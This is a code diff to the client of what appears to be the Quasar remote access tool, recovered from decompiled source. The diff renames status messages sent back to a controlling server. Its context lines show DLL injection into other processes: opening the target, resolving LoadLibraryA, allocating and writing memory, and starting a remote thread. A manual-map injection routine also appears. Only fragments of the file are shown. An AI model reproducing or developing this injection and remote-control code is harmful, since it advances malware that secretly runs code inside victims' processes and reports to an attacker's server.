@@ -24,14 +24,14 @@ namespace Quasar.Client.Helper
                 if (hProcess == IntPtr.Zero)
                 {
                     MessageBox.Show("failed to open process");
-                    //client.Send(new SetStatus { Message = $"Failed to open process {processName} (ID: {process.Id}). Error: {Marshal.GetLastWin32Error()}" });
+                    //client.Send(new NotifyMessageToServer { Message = $"Failed to open process {processName} (ID: {process.Id}). Error: {Marshal.GetLastWin32Error()}" });
                     continue;
                 }
                 IntPtr procAddress = NativeMethods.GetProcAddress(NativeMethods.GetModuleHandle("kernel32.dll"), "LoadLibraryA");
                 if (procAddress == IntPtr.Zero)
                 {
                     MessageBox.Show("failed to get loadlibrarya address");
-                    //client.Send(new SetStatus { Message = "Failed to get LoadLibraryA address. Error: " + Marshal.GetLastWin32Error() });
+                    //client.Send(new NotifyMessageToServer { Message = "Failed to get LoadLibraryA address. Error: " + Marshal.GetLastWin32Error() });
                     NativeMethods.CloseHandle(hProcess);
                     continue;
                 }
@@ -39,7 +39,7 @@ namespace Quasar.Client.Helper
                 if (intPtr == IntPtr.Zero)
                 {
                     MessageBox.Show("Failed to allocate memory in target process.");
-                    //client.Send(new SetStatus { Message = "Failed to allocate memory in target process. Error: " + Marshal.GetLastWin32Error() });
+                    //client.Send(new NotifyMessageToServer { Message = "Failed to allocate memory in target process. Error: " + Marshal.GetLastWin32Error() });
                     NativeMethods.CloseHandle(hProcess);
                     continue;
                 }
@@ -48,7 +48,7 @@ namespace Quasar.Client.Helper
                 if (!NativeMethods.WriteProcessMemory(hProcess, intPtr, array, (uint)array.Length, out uintPtr))
                 {
                     MessageBox.Show("Failed to write to process memory.");
-                    //client.Send(new SetStatus { Message = "Failed to write to process memory. Error: " + Marshal.GetLastWin32Error() });
+                    //client.Send(new NotifyMessageToServer { Message = "Failed to write to process memory. Error: " + Marshal.GetLastWin32Error() });
                     NativeMethods.VirtualFreeEx(hProcess, intPtr, 0, 0x8000); // MEM_RELEASE
                     NativeMethods.CloseHandle(hProcess);
                     continue;
@@ -58,17 +58,16 @@ namespace Quasar.Client.Helper
                 if (remoteThread == IntPtr.Zero)
                 {
                     MessageBox.Show("Failed to create remote thread.");
-                    //client.Send(new SetStatus { Message = "Failed to create remote thread. Error: " + Marshal.GetLastWin32Error() });
+                    //client.Send(new NotifyMessageToServer { Message = "Failed to create remote thread. Error: " + Marshal.GetLastWin32Error() });
                     NativeMethods.VirtualFreeEx(hProcess, intPtr, 0, 0x8000); // MEM_RELEASE
                 }
 
                 NativeMethods.CloseHandle(hProcess);
-                // client.Send(new SetStatus { Message = "injection is ended" });
+                // client.Send(new NotifyMessageToServer { Message = "injection is ended" });
                 MessageBox.Show("injection end");
             }
         }
 
-        // Token: 0x060005F9 RID: 1529 RVA: 0x00016704 File Offset: 0x00014904
         public static string[] InjectManualMap(string processName, string dllPath, bool isWow64)
         {
             List<string> list = new List<string>();
@@ -171,7 +170,7 @@ namespace Quasar.Client.Helper
                 IntPtr hProcess = process.Handle;
                 if (!NativeMethods.IsWow64Process(hProcess, out isWow64))
                 {
-                    client.Send(new SetStatus { Message = "Quering process bitness failed" });
+                    client.Send(new NotifyMessageToServer { Message = "Quering process bitness failed" });
                 }
             }
             if (isWow64)
@@ -189,7 +188,7 @@ namespace Quasar.Client.Helper
                 catch (Exception ex5)
                 {
                     isSucess = false;
-                    client.Send(new SetStatus { Message = string.Format("{0}:{1}\n\n{2}", Misc.__FILE__("MiscHandler1.cs"), Misc.__LINE__(244), ex5.Message) });
+                    client.Send(new NotifyMessageToServer { Message = string.Format("{0}:{1}\n\n{2}", Misc.__FILE__("MiscHandler1.cs"), Misc.__LINE__(244), ex5.Message) });
                 }
             }
             else
@@ -207,7 +206,7 @@ namespace Quasar.Client.Helper
                 catch (Exception ex5)
                 {
                     isSucess = false;
-                    client.Send(new SetStatus { Message = string.Format("{0}:{1}\n\n{2}", Misc.__FILE__("MiscHandler2.cs"), Misc.__LINE__(244), ex5.Message) });
+                    client.Send(new NotifyMessageToServer { Message = string.Format("{0}:{1}\n\n{2}", Misc.__FILE__("MiscHandler2.cs"), Misc.__LINE__(244), ex5.Message) });
                 }
             }
             foreach(Process process in processes)
@@ -219,7 +218,7 @@ namespace Quasar.Client.Helper
                 catch (Exception ex6)
                 {
                     isSucess = false;
-                    client.Send(new SetStatus { Message = string.Format("{0}:{1}\n\n{2}", Misc.__FILE__("MiscHandler3.cs"), Misc.__LINE__(253), ex6.Message) });
+                    client.Send(new NotifyMessageToServer { Message = string.Format("{0}:{1}\n\n{2}", Misc.__FILE__("MiscHandler3.cs"), Misc.__LINE__(253), ex6.Message) });
                 }
             }
 
